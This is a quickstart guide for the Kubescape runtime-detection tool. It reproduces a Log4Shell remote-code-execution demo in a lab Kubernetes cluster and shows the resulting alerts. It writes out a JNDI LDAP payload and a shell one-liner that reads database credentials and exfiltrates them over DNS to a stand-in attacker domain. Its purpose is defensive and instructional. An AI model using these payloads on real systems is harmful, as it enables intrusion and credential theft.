# Quickstart

Kubescape catching a live Log4Shell RCE — a shell spawned by a JVM worker thread, then its recon and
exfiltration children, every one of them outside the workload's declared Bill of Behavior:

![Kubescape detecting a Log4Shell RCE against a Bill of Behavior](l4j-detection.gif)

This page reproduces exactly that, end to end, using the public
[`log4j-chain`](https://github.com/k8sstormcenter/bob/tree/main/example/log4j-chain) demo — a
`frontend → backend → postgres` app whose backend runs a vulnerable `log4j`. Every manifest is
applied straight from GitHub; you only need to read the few lines that matter.

!!! note "What you need"
    - A Kubernetes cluster and `kubectl`.
    - `helm`.

## 1. Install Kubescape with runtime detection on

```bash
helm repo add k8sstormcenter https://k8sstormcenter.github.io/helm-charts
helm repo update
helm install kubescape k8sstormcenter/kubescape-operator \
  --version 1.40.3-sbob-rc3.1 \
  -n kubescape --create-namespace \
  --set capabilities.runtimeObservability=enable \
  --set capabilities.runtimeDetection=enable \
  --set alertCRD.installDefault=true
```

The **network** rules (DNS/egress) only fire if network detection is **enabled and configured
correctly**. Two parts: the network rules must be *on*, and the alerts must reach an *exporter you
can read*. Enable R0011 (it ships **off**) in the installed rules:

```bash
kubectl -n kubescape patch rules.kubescape.io default-rules --type=json \
  -p "$(kubectl -n kubescape get rules.kubescape.io default-rules -o json \
        | jq -c '[.spec.rules | to_entries[] | select(.value.id=="R0011")
                 | {op:"replace", path:"/spec/rules/\(.key)/enabled", value:true}]')"
```

Then confirm your config matches — network tracing on, R0011 enabled, and at least one exporter set:

```bash
kubectl -n kubescape get cm node-agent -o yaml \
  | grep -iE 'networkServiceEnabled|stdoutExporter|ExporterUrl|syslog|httpExporter'
kubectl -n kubescape get rules.kubescape.io default-rules -o json \
  | jq '.spec.rules[] | select(.id=="R0011") | {id, name, enabled}'
```

Node-agent writes alerts to **stdout** by default (`stdoutExporter: true` — read them with
`kubectl logs`); it can also push to Alertmanager, syslog, or an HTTP endpoint
(`nodeAgent.config.alertManagerExporterUrls` / `syslogExporterURL` / `httpExporterConfig`). Use
whichever you have — just make sure one is configured.

!!! info "Which build is this"
    `sbob-rc3` is the release candidate that ships the Bill of Behavior features (wildcards, signing,
    tamper detection) from `ghcr.io/k8sstormcenter/{storage,node-agent}`.

## 2. Deploy the vulnerable app + the attacker

One manifest brings up the whole chain (namespace `log4j-poc`) plus the in-cluster attacker
(`attacker-ns`): a marshalsec LDAP server and a class-file HTTP server.

```bash
kubectl apply -f https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/log4j-chain.yaml
kubectl -n attacker-ns rollout status deploy/attacker --timeout=60s
```

The only line that makes this exploitable is the backend's log4j version:

```yaml
# backend container, in log4j-chain.yaml
image: ghcr.io/k8sstormcenter/chain-backend:vulnerable   # log4j 2.14.1 — JNDI lookups enabled
```

## 3. Give the backend its Bill of Behavior

Apply the signed profiles that declare what each workload may do. These are supplied, not learned —
so detection is live immediately, with no learning period:

```bash
BASE=https://raw.githubusercontent.com/k8sstormcenter/bob/main/_artifacts/log4j-sbobs
for w in backend frontend observer postgres; do
  kubectl apply -f "$BASE/ap-chain-$w.yaml" -f "$BASE/nn-chain-$w.yaml"
done
```

Two sections of the backend's Bill of Behavior are what the whole demo turns on. First, the
`ApplicationProfile` — the executables it may run:

```yaml
# ap-chain-backend.yaml — allowed executables
execs:
- { path: /opt/java/openjdk/bin/java, args: ["java", "-jar", "/app/app.jar"] }
- { path: /usr/bin/curl }
- { path: /usr/bin/psql,                         args: ["/usr/bin/psql"] }  # the symlink…
- { path: /usr/lib/postgresql/18/bin/psql,       args: ["/usr/lib/postgresql/18/bin/psql", "⋯⋯"] }
#   ↑ …and the real binary the wrapper execs. node-agent sees the *resolved*
#     path, so both must be listed; ⋯⋯ allows any psql arguments.
# no sh, no getent, no base32 — anything else is drift
```

!!! tip "Symlinks resolve — list the real binary"
    A profile that only lists `/usr/bin/psql` still alerts, because `psql` is a
    wrapper that execs `/usr/lib/postgresql/18/bin/psql` and node-agent traces the
    resolved path. Allow the binary the process actually runs. The `⋯⋯` token is the
    exec-arg wildcard (zero-or-more args).

Second, the `NetworkNeighborhood` — the only connections it may make:

```yaml
# nn-chain-backend.yaml — allowed network
ingress:
- from: { app: chain-frontend }   ports: [ TCP/8080 ]   # serves the frontend
- from: { app: chain-observer }   ports: [ TCP/8080 ]
egress:
- to: kube-dns                    ports: [ UDP/53, TCP/53 ]
- to: { app: chain-postgres }     ports: [ TCP/5432 ]     # reads the database
# NOT the attacker's LDAP, NOT arbitrary exfil domains
```

`psql` and the postgres egress are *allowed* — this app really does query a database. So the attack
cannot hide by using them. What it *cannot* do without deviating is spawn a shell, run `getent`,
resolve an unknown domain, or open an egress to the attacker. That is where it gets caught.

## 4. Fire the exploit

The attack pod sends the classic JNDI payload in a `User-Agent` header. Substitute the pod-name
placeholder and apply it in one line:

```bash
curl -sL https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/attack-pod.yaml \
  | sed 's/attack-PLACEHOLDER/attack-a/' | kubectl apply -f -
```

The single line that is the attack:

```yaml
# attack-pod.yaml — the probe
args: [ curl, -s, -A,
        '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}',
        'http://frontend:8080/api/products?q=test' ]
```

!!! note "For the network rules, point the JNDI at a *public* LDAP"
    The in-cluster attacker above is a private ClusterIP, so it triggers the RCE (R0001) but **not**
    R0011 (which skips private targets). To see the full DNS + egress detection, run the attacker on
    an external host and point the JNDI at it, e.g.
    `${jndi:ldap://<public-host>:1389/Payload}`. The demo's attacker image takes the codebase host as
    an env var (`CODEBASE_HOST`), so it can run anywhere.

## 5. See the detection

First, recall what the profile **allows** — the two lists from the gif. Nothing here ever alerts:

```bash
kubectl -n log4j-poc get applicationprofile chain-backend \
  -o jsonpath='{range .spec.containers[0].execs[*]}{.path}{"\n"}{end}'
#  /opt/java/openjdk/bin/java   /usr/bin/java   /usr/bin/curl
#  /usr/bin/psql   /usr/lib/postgresql/18/bin/psql          # the DB client + its resolved binary

kubectl -n log4j-poc get networkneighborhood chain-backend \
  -o jsonpath='{range .spec.containers[0].egress[*]}{.identifier}{"\n"}{end}'
#  egress-kube-dns   egress-chain-postgres                  # DNS + the database, nothing else
```

Now fire the payload and read the raw alerts — **one JSON object per rule violation**:

```bash
kubectl -n kubescape logs -l app=node-agent --tail=200 | grep KubescapeRuleViolated \
  | jq -c '{RuleID, alertName: .BaseRuntimeMetadata.alertName, args: .BaseRuntimeMetadata.arguments}'
```

#### R0001 — remote code execution

The alert's process tree is the smoking gun — a **JVM worker thread** spawned a shell:

```
java  (parent: containerd-shim)
 └─ sh  (parent: pool-2-thread-2)      ← a log4j/HTTP worker thread; a web server never execs a shell
```

and that shell's command line (the alert's `arguments.args`) is the entire attack in one line:

```bash
sh -c 'ROW=$(psql -h chain-postgres -U postgres -At -c "SELECT current_database()||chr(58)||current_user")
       ENC=$(printf "%s" "$ROW" | base32 | tr -d "=" | cut -c1-40)
       getent hosts "${ENC}.exfil.attacker.example.com"'      # read DB → encode → exfil over DNS
```

Every non-`java` binary that shell runs is outside the profile, so each raises its own R0001:

```json
{"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/bin/sh","comm":"sh","pcomm":"pool-2-thread-2"}
{"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/usr/bin/base32","comm":"base32","pcomm":"sh"}
{"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/usr/bin/tr","comm":"tr","pcomm":"sh"}
{"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/usr/bin/cut","comm":"cut","pcomm":"sh"}
{"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/usr/bin/getent","comm":"getent","pcomm":"sh"}
```

`psql` runs too — it's the payload reading the database — but `psql` **is** in the profile, so it
does *not* alert. The attacker is abusing a permitted tool; the tell is the shell wrapped around it.

#### R0005 — data exfiltration over DNS

`getent` performs a DNS lookup, and the hostname it queries *is* the stolen data:

```json
{"RuleID":"R0005","alertName":"DNS Anomalies in container",
 "domain":"OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ.exfil.attacker.example.com.","protocol":"UDP","port":39361}
```

Decode the label — `echo OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ | base32 -d` → **`postgres:postgres`** — the
database identity, smuggled out one DNS query at a time to a domain the profile never allows. That's
the classic DNS-exfiltration channel, caught because the *domain*, not just the connection, is
outside the `NetworkNeighborhood`.

#### R0011 — the Log4Shell call-out (two stages)

The vulnerable log4j reaches the attacker over TCP, to an address not in the egress allow-list, in
the two stages that define the exploit:

```json
{"RuleID":"R0011","alertName":"Unexpected Egress Network Traffic","ip":"<attacker>","port":1389,"proto":"TCP"}
{"RuleID":"R0011","alertName":"Unexpected Egress Network Traffic","ip":"<attacker>","port":8888,"proto":"TCP"}
```

Stage 1 (`:1389`) is the **LDAP referral** — the JNDI lookup that tells the victim *where* the payload
lives. Stage 2 (`:8888`) is the **HTTP download** of `Payload.class`. Two outbound connections a web
backend has no business making.

!!! note "Why the ports may look odd"
    R0011 needs a **non-private** target, so the attacker has to be external. In our capture it sits
    behind a public tunnel that remaps the ports — the alerts show `19174`/`5516` instead of
    `1389`/`8888`. A directly-reachable attacker would show the standard ports. And if the JNDI targets
    an **IP** instead of a hostname, there's no LDAP DNS lookup — the call-out is pure TCP, carried by
    R0011, not R0005.

That is the whole compromise — RCE, credential theft, DNS exfiltration, and the C2 call-out —
reconstructed from kernel events and caught purely by deviation from the signed Bill of Behavior.

!!! warning "What gates the network rules (R0005 / R0011)"
    - **R0011 is disabled by default** — enable it (see step 1) and verify with the `jq` check there.
    - **Network detection must be enabled and its alerts readable** — network tracing on, and an
      exporter you can read (stdout by default, or Alertmanager/syslog/HTTP). Don't assume
      Alertmanager — check what your cluster has.
    - **The attacker must be non-private** — R0011 skips RFC-1918/ClusterIP targets, so the LDAP
      server has to be a real external/public host. An in-cluster attacker trips R0001 but never R0011.

You detected Log4Shell with **no CVE signature and no learning period** — purely because the backend
did something its signed Bill of Behavior declares it never does.

```bash
kubectl delete ns log4j-poc attacker-ns      # clean up
```

## Next

- **[End-to-end example](tutorial.md)** — the same chain across three backends (vulnerable /
  contained / patched), showing how the profile tells a *successful* exploit from a *contained* one.
- **[What is a Bill of Behavior](index.md)** — the concept, the custom resources, and how wildcards,
  signing, and compaction let you *ship* a profile instead of learning one.
- **[Node Agent Rule Library](../node-agent-rule-library.md)** — the full catalog of detection rules.
